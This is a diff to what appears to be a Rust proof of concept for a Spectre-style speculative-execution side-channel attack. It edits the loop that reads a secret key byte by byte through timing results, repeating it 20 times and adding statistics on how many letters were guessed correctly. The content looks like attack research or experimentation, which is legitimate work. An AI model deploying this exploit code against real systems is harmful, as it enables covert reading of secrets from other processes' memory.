@@ -2,6 +2,8 @@
 use std::arch::asm;
 use std::arch::x86_64::*;
 use rand::Rng;
+use std::io;
+use std::io::Write;
 
 const NUM_TRIES: u64 = 1000;
 const TRAINING_LOOPS: usize = 100;
@@ -185,32 +187,47 @@ fn main() {
     let arr1_slice = &arr1[..((rng.gen::<usize>() % (arr1.len()-1)))+1];
     let mut arr1_len: usize = arr1_slice.len();
 
-    println!("Reading {} bytes from target ::", arr1.len());
-    let mut guessed_secret = String::new(); // This will store the most-likely value of the SECRET_KEY overall
-    let mut sum: u8 = 0;
-    for i in 0..secret.len() {
-        println!("Reading at Target Address = {}", target_idx + i);
+    let mut correct_letters: usize = 0;
+    let mut total_letters: usize = 0;
 
-        sum = read_memory_byte(target_idx + i, &is_attack, &arr1, &mut arr1_len, &mut arr2, &attack_pattern, &mut results, attack_pattern[0] as usize) - sum;
-        // println!("results = {:?}", results);
-        // results[b'q' as usize] = 999;
+    for _ in 0..20 {
+      // println!("Reading {} bytes from target ::", arr1.len());
+      let mut guessed_secret = String::new(); // This will store the most-likely value of the SECRET_KEY overall
+      let mut sum: u8 = 0;
+      for i in 0..secret.len() {
+          // println!("Reading at Target Address = {}", target_idx + i);
+  
+          sum = read_memory_byte(target_idx + i, &is_attack, &arr1, &mut arr1_len, &mut arr2, &attack_pattern, &mut results, attack_pattern[0] as usize) - sum;
+          // println!("results = {:?}", results);
+          // results[b'q' as usize] = 999;
+  
+          /* get the most likely character */
+          let mut most_likely_char: u8 = b'?';
+          let mut min_result: u32 = 9999999;
+          for i in 0..256 {
+             let curr_char: u8 = attack_pattern[i];
+             if results[curr_char as usize] < min_result && curr_char > 31 && curr_char < 127 {
+               min_result = results[curr_char as usize];
+               most_likely_char = curr_char;
+             }
+          }
+          println!("Char: '{}', Score: {}, Sum: {}", most_likely_char as char, min_result, sum);
+          // print!("."); io::stdout().flush().unwrap();
+  
+          guessed_secret.push(most_likely_char as char);
+      }
 
-        /* get the most likely character */
-        let mut most_likely_char: u8 = b'?';
-        let mut min_result: u32 = 9999999;
-        for i in 0..256 {
-           let curr_char: u8 = attack_pattern[i];
-           if results[curr_char as usize] < min_result && curr_char > 31 && curr_char < 127 {
-             min_result = results[curr_char as usize];
-             most_likely_char = curr_char;
-           }
+      println!("Guessed secret = {}", guessed_secret);
+
+      total_letters += guessed_secret.len();
+      for i in 0..guessed_secret.len() {
+        if secret[i] == guessed_secret.as_bytes()[i]
+        {
+          correct_letters += 1;
         }
-        println!("Char: '{}', Score: {}, Sum: {}", most_likely_char as char, min_result, sum);
-
-        guessed_secret.push(most_likely_char as char);
+      }
     }
 
-    println!("Guessed secret = {}", guessed_secret);
-
+    println!("Final stats: {}% correct guesses. ({} out of {} letters).", (correct_letters as f64)/(total_letters as f64)*100.0, correct_letters, total_letters);
 }
 
